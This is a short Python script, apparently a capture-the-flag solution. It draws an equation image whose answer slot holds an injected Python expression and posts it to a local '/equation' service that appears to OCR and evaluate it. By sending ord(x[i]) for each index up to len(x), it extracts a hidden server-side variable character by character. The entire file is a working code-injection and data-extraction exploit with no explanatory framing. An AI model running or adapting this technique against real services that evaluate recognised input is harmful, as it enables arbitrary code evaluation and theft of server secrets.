from io import BytesIO

import requests
from bs4 import BeautifulSoup
from PIL import Image, ImageDraw, ImageFont

fnt = ImageFont.truetype("/usr/share/fonts/gnu-free/FreeMono.otf", 40)


def exec(cmd: str) -> int:
    out = Image.new("RGB", (1000, 1000), (255, 255, 255))
    d = ImageDraw.Draw(out)
    d.multiline_text((10, 10), f"1 + 1 = {cmd}", font=fnt, fill=(0, 0, 0))
    image = BytesIO()
    out.save(image, "png")
    response = requests.post(
        "http://localhost:5000/equation",
        files={
            "file": ("image.png", image.getvalue(), "image/png"),
        },
    )
    bs = BeautifulSoup(response.content, "lxml")
    return int(bs.select_one(".cover-heading").text.split(" ")[-1])


print("".join([chr(exec(f"ord(x[{i}])")) for i in range(exec("len(x)"))]))
